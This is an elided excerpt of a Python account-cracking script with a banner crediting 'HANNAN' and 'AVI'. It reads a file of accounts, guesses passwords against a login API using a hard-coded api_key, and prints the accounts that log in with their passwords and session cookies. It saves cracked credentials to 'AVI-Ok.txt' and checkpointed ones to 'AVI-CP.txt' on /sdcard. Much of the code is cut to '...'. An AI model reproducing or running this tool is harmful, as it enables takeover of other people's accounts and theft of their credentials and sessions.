#Coded by HANNAN . Modified by AVI
...
logo=(f"""\u001b[1;96m
 ...
 .d8b.  db    db d888888b      db   db d88888b db    db 
...
def file():
    ...
    file = input(f"{oo('-')}Enter file path: ")
...
def method():
    ...
    lp = input(f'{oo("?")}Limit of password: ')
    ...
    "api_key": "882a8490361da98702bf97a021ddc14d",
              ...
              if "session_key" in response:
                 ...
                 print('\033[1;32m[AVI-OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)

                 print(" [Cookie] ",cookie)

                 open('/sdcard/AVI-Ok.txt','a').write(f'{acc}|{pswd}\n')
                ...
                print('\033[1;31m[AVI-CP] \033[1;31m'+acc+' \033[1;31m|\033[1;31m '+pswd)

                open('/sdcard/AVI-CP.txt','a').write(f'{acc}|{pswd}\n')
